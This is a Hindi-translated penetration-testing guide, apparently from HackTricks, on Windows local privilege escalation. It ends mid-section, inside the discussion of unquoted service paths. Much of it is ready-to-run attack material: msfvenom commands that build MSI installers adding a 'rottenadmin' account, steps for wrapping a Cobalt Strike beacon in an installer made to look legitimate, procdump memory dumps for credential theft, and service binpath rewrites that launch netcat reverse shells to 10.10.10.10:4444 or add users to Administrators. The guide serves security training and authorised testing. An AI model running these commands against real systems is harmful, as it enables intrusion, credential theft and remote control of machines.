# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows स्थानीय विशेषाधिकार वृद्धि वेक्टर की खोज के लिए सबसे अच्छा उपकरण:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### एक्सेस टोकन

**यदि आप नहीं जानते कि Windows एक्सेस टोकन क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ को पढ़ें:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ की जांच करें:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### इंटीग्रिटी लेवल्स

**यदि आप नहीं जानते कि Windows में इंटीग्रिटी लेवल्स क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ को पढ़ें:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीजें हैं जो **आपको सिस्टम की गणना करने से रोक सकती हैं**, निष्पादन योग्य चलाने या यहां तक कि **आपकी गतिविधियों का पता लगाने** से भी। आपको विशेषाधिकार वृद्धि गणना शुरू करने से पहले निम्नलिखित **पृष्ठ** को **पढ़ना** और इन सभी **रक्षा** **यंत्रों** की **गणना** करनी चाहिए:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### संस्करण जानकारी गणना

जांचें कि क्या Windows संस्करण में कोई ज्ञात भेद्यता है (लागू पैच भी जांचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो **massive attack surface** को दर्शाती हैं जो एक Windows वातावरण प्रस्तुत करता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई क्रेडेंशियल/जूसि जानकारी सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप सीख सकते हैं कि इसे कैसे चालू किया जाए [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन का विवरण दर्ज किया जाता है, जिसमें निष्पादित कमांड, कमांड कॉल और स्क्रिप्ट के भाग शामिल होते हैं। हालाँकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम कैप्चर नहीं किए जा सकते हैं।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" अनुभाग में दिए गए निर्देशों का पालन करें, **"Powershell Transcription"** के बजाय **"Module Logging"** का विकल्प चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell लॉग से अंतिम 15 घटनाओं को देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और पूर्ण सामग्री रिकॉर्ड की जाती है, यह सुनिश्चित करते हुए कि कोड के प्रत्येक ब्लॉक को उसके चलने के समय दस्तावेजित किया जाता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल बनाए रखती है, जो फॉरेंसिक्स और दुर्भावनापूर्ण व्यवहार का विश्लेषण करने के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेजित करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
स्क्रिप्ट ब्लॉक के लिए लॉगिंग इवेंट्स Windows Event Viewer में निम्नलिखित पथ पर स्थित हो सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
अंतिम 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** का उपयोग करके अनुरोध नहीं किए जाते हैं, तो आप सिस्टम को समझौता कर सकते हैं।

आप निम्नलिखित चलाकर जांच करते हैं कि क्या नेटवर्क एक गैर-SSL WSUS अपडेट का उपयोग कर रहा है:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
आपको यदि इस तरह का उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` `1` के बराबर है।

तो, **यह exploitable है।** यदि अंतिम रजिस्ट्री `0` के बराबर है, तो WSUS प्रविष्टि को अनदेखा किया जाएगा।

इन कमजोरियों का लाभ उठाने के लिए आप उपकरणों का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ये MiTM हथियारबंद exploits स्क्रिप्ट हैं जो गैर-SSL WSUS ट्रैफ़िक में 'फर्जी' अपडेट इंजेक्ट करने के लिए हैं।

यहाँ शोध पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूर्ण रिपोर्ट यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी रूप से, यह वह दोष है जिसका लाभ यह बग उठाता है:

> यदि हमारे पास अपने स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और Windows Updates इंटरनेट एक्सप्लोरर की सेटिंग में कॉन्फ़िगर की गई प्रॉक्सी का उपयोग करता है, तो हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को स्थानीय रूप से चलाने की शक्ति है ताकि हम अपने स्वयं के ट्रैफ़िक को इंटरसेप्ट कर सकें और अपने संपत्ति पर एक उच्च उपयोगकर्ता के रूप में कोड चला सकें।
>
> इसके अलावा, चूंकि WSUS सेवा वर्तमान उपयोगकर्ता की सेटिंग का उपयोग करती है, यह इसके प्रमाणपत्र स्टोर का भी उपयोग करेगी। यदि हम WSUS होस्टनाम के लिए एक स्व-हस्ताक्षरित प्रमाणपत्र उत्पन्न करते हैं और इस प्रमाणपत्र को वर्तमान उपयोगकर्ता के प्रमाणपत्र स्टोर में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट करने में सक्षम होंगे। WSUS प्रमाणपत्र पर पहले उपयोग पर विश्वास करने के प्रकार की मान्यता लागू करने के लिए कोई HSTS-जैसे तंत्र का उपयोग नहीं करता है। यदि प्रस्तुत प्रमाणपत्र उपयोगकर्ता द्वारा विश्वसनीय है और सही होस्टनाम है, तो इसे सेवा द्वारा स्वीकार किया जाएगा।

आप इस कमजोरी का लाभ [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) उपकरण का उपयोग करके उठा सकते हैं (जब यह मुक्त हो जाए)।

## KrbRelayUp

Windows **डोमेन** वातावरण में एक **स्थानीय विशेषाधिकार वृद्धि** की कमजोरी विशेष परिस्थितियों में मौजूद है। इन परिस्थितियों में वे वातावरण शामिल हैं जहाँ **LDAP साइनिंग लागू नहीं है,** उपयोगकर्ताओं के पास **Resource-Based Constrained Delegation (RBCD)** को कॉन्फ़िगर करने के लिए स्व-अधिकार हैं, और उपयोगकर्ताओं के लिए डोमेन के भीतर कंप्यूटर बनाने की क्षमता है। यह ध्यान रखना महत्वपूर्ण है कि ये **आवश्यकताएँ** **डिफ़ॉल्ट सेटिंग्स** का उपयोग करके पूरी की जाती हैं।

**एक्सप्लॉइट खोजें** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

हमले के प्रवाह के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्टर **सक्षम** हैं (मान **0x1** है), तो किसी भी विशेषाधिकार के उपयोगकर्ता `*.msi` फ़ाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **स्थापित** (निष्पादित) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक मीटरप्रेटर सत्र है, तो आप इस तकनीक को **`exploit/windows/local/always_install_elevated`** मॉड्यूल का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

`Write-UserAddMSI` कमांड का उपयोग करें power-up से वर्तमान निर्देशिका के अंदर एक Windows MSI बाइनरी बनाने के लिए ताकि विशेषाधिकार बढ़ाए जा सकें। यह स्क्रिप्ट एक पूर्व-संकलित MSI इंस्टॉलर लिखती है जो उपयोगकर्ता/समूह जोड़ने के लिए संकेत देती है (इसलिए आपको GIU पहुंच की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए बाइनरी को कार्यान्वित करें ताकि विशेषाधिकार बढ़ सके।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप इस उपकरणों का उपयोग करके एक MSI wrapper कैसे बनाएं। ध्यान दें कि आप एक "**.bat**" फ़ाइल को लपेट सकते हैं यदि आप **बस** **कमांड लाइनों** को **कार्यन्वित** करना चाहते हैं।

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाएं

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाएं

- **Cobalt Strike** या **Metasploit** के साथ एक **नया Windows EXE TCP payload** `C:\privesc\beacon.exe` में **जनरेट** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और खोज बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **सॉल्यूशन और प्रोजेक्ट को एक ही निर्देशिका में रखें** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप 4 में से 3 चरण पर नहीं पहुँचते (शामिल करने के लिए फ़ाइलें चुनें)। **Add** पर क्लिक करें और उस Beacon payload को चुनें जिसे आपने अभी जनरेट किया है। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में, **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य गुण भी हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer** जो स्थापित ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। यह सुनिश्चित करेगा कि beacon payload इंस्टॉलर चलने पर तुरंत कार्यान्वित हो।
- **Custom Action Properties** के तहत, **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई देती है, तो सुनिश्चित करें कि आपने प्लेटफ़ॉर्म को x64 पर सेट किया है।

### MSI स्थापना

**पृष्ठभूमि** में दुर्भावनापूर्ण `.msi` फ़ाइल की **स्थापना** को कार्यान्वित करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस कमजोरियों का लाभ उठाने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स यह तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि लॉग कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** स्थानीय व्यवस्थापक पासवर्डों के **प्रबंधन** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **विशिष्ट, यादृच्छिक, और नियमित रूप से अपडेट** किया गया है उन कंप्यूटरों पर जो एक डोमेन से जुड़े हैं। ये पासवर्ड सक्रिय निर्देशिका में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हैं, जिससे उन्हें स्थानीय व्यवस्थापक पासवर्ड देखने की अनुमति मिलती है यदि अधिकृत हो।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **सादा-टेक्स्ट पासवर्ड LSASS** (स्थानीय सुरक्षा प्राधिकरण उपप्रणाली सेवा) में संग्रहीत होते हैं।\
[**WDigest के बारे में अधिक जानकारी इस पृष्ठ पर**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

**Windows 8.1** से शुरू होकर, Microsoft ने स्थानीय सुरक्षा प्राधिकरण (LSA) के लिए बेहतर सुरक्षा पेश की है ताकि **अविश्वसनीय प्रक्रियाओं** द्वारा इसकी **मेमोरी** को **पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **ब्लॉक** किया जा सके, जिससे सिस्टम की सुरक्षा और बढ़ गई है।\
[**LSA सुरक्षा के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य एक डिवाइस पर संग्रहीत क्रेडेंशियल्स को पास-थ-हैश हमलों जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**डोमेन क्रेडेंशियल्स** को **स्थानीय सुरक्षा प्राधिकरण** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का लॉगिन डेटा एक पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणित किया जाता है, तो उपयोगकर्ता के लिए डोमेन क्रेडेंशियल्स आमतौर पर स्थापित किए जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

आपको यह जांचना चाहिए कि क्या आप जिन समूहों में हैं, उनमें कोई दिलचस्प अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप **किसी विशेषाधिकार प्राप्त समूह का हिस्सा हैं, तो आप विशेषाधिकार बढ़ाने में सक्षम हो सकते हैं**। विशेषाधिकार प्राप्त समूहों के बारे में जानें और उन्हें विशेषाधिकार बढ़ाने के लिए कैसे दुरुपयोग करें यहाँ:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ पर **दिलचस्प tokens के बारे में जानें** और उन्हें कैसे दुरुपयोग करें:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की कमांड लाइन के अंदर पासवर्ड की जांच करें**।\
जांचें कि क्या आप **कुछ बाइनरी को ओवरराइट कर सकते हैं** या यदि आपके पास संभावित [**DLL Hijacking हमलों**](dll-hijacking/index.html) का लाभ उठाने के लिए बाइनरी फ़ोल्डर की लिखने की अनुमतियाँ हैं:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हैं, आप इसका दुरुपयोग करके विशेषाधिकार बढ़ा सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रक्रियाओं के बाइनरी की अनुमतियों की जांच करना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रक्रियाओं के बाइनरी के फ़ोल्डरों की अनुमतियों की जांच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड खनन

आप **procdump** का उपयोग करके एक चल रहे प्रक्रिया का मेमोरी डंप बना सकते हैं जो sysinternals से है। FTP जैसी सेवाओं में **स्मृति में स्पष्ट पाठ में क्रेडेंशियल्स होते हैं**, मेमोरी को डंप करने और क्रेडेंशियल्स को पढ़ने का प्रयास करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन एक उपयोगकर्ता को CMD उत्पन्न करने या निर्देशिकाओं को ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" के लिए खोजें, "Command Prompt खोलने के लिए क्लिक करें" पर क्लिक करें

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

आप **sc** का उपयोग करके सेवा की जानकारी प्राप्त कर सकते हैं
```bash
sc qc <service_name>
```
यह अनुशंसा की जाती है कि प्रत्येक सेवा के लिए आवश्यक विशेषाधिकार स्तर की जांच करने के लिए _Sysinternals_ से बाइनरी **accesschk** हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि यह जांचें कि क्या "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप accesschk.exe को XP के लिए यहाँ डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
&#xNAN;_&#x54;सेवा शुरू नहीं की जा सकती, या तो क्योंकि इसे अक्षम किया गया है या क्योंकि इसके साथ कोई सक्षम उपकरण नहीं जुड़े हैं।_

आप इसे सक्षम करने के लिए उपयोग कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**यह ध्यान में रखें कि सेवा upnphost SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और समाधान** यह है कि चलाएँ:
```
sc.exe config usosvc start= auto
```
### **सेवा बाइनरी पथ को संशोधित करें**

उस परिदृश्य में जहां "प्रमाणित उपयोगकर्ता" समूह के पास एक सेवा पर **SERVICE_ALL_ACCESS** है, सेवा के निष्पादन योग्य बाइनरी में संशोधन करना संभव है। **sc** को संशोधित और निष्पादित करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः प्रारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: सेवा बाइनरी को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमति पुनः कॉन्फ़िगर करने की अनुमति देता है, जिससे सेवा कॉन्फ़िगरेशन बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व अधिग्रहण और अनुमति पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: सेवा कॉन्फ़िगरेशन बदलने की क्षमता विरासत में प्राप्त करता है।
- **GENERIC_ALL**: सेवा कॉन्फ़िगरेशन बदलने की क्षमता भी विरासत में प्राप्त करता है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

आपको यह जांचना चाहिए कि क्या आप किसी सेवा रजिस्ट्र्री को संशोधित कर सकते हैं।\
आप एक सेवा **रजिस्ट्र्री** पर अपनी **अनुमतियों** की **जांच** करने के लिए:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं या नहीं। यदि हाँ, तो सेवा द्वारा निष्पादित बाइनरी को बदला जा सकता है।

निष्पादित बाइनरी के पथ को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास एक रजिस्ट्री पर यह अनुमति है, तो इसका मतलब है कि **आप इस रजिस्ट्री से उप-रजिस्ट्री बना सकते हैं**। Windows सेवाओं के मामले में, यह **मनमाने कोड को निष्पादित करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी निष्पादन योग्य का पथ उद्धरण के अंदर नहीं है, तो Windows हर स्पेस से पहले समाप्त होने वाले को निष्पादित करने की कोशिश करेगा।

उदाहरण के लिए, पथ _C:\Program Files\Some Folder\Service.exe_ के लिए, Windows निष्पादित करने की कोशिश करेगा:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी अनउद्धृत सेवा पथों की सूची बनाएं, जो अंतर्निहित Windows सेवाओं से संबंधित नहीं हैं:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
